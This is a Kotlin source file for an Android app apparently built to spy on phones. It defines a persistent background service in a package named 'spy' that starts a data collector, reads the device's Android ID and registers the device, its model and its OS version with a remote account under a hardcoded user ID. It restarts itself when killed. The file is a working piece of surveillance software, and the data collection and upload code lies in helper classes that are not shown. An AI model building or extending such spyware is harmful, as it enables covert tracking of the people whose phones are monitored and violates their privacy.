package com.gauravhanna.spy

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class BackgroundService : Service() {
    private val CHANNEL_ID = "spy_channel"
    private val NOTIFICATION_ID = 123

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, getNotification())
        DataCollector.start(this)
        // Register device (replace with your actual user ID)
        val deviceId = android.provider.Settings.Secure.getString(contentResolver,
            android.provider.Settings.Secure.ANDROID_ID)
        NetworkHelper.registerDevice(this, deviceId, Build.MODEL, Build.MODEL,
            Build.VERSION.RELEASE, "69c641828632b981c0e436c4")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID,
                "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GauravHanna Spy")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}